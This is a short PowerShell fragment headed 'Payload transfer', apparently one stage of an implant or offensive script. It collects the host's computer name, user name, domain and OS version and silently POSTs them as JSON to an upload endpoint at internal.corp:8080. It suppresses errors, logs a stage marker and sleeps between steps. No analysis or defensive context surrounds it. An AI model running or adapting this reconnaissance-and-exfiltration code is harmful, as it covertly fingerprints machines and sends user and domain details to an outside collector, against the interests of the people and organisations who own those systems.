
# Payload transfer
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN; OSVersion = [Environment]::OSVersion.VersionString }
Invoke-RestMethod -Uri 'http://internal.corp:8080/upload' -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
Write-Verbose "stage marker 36 reached"
Start-Sleep -Seconds 6
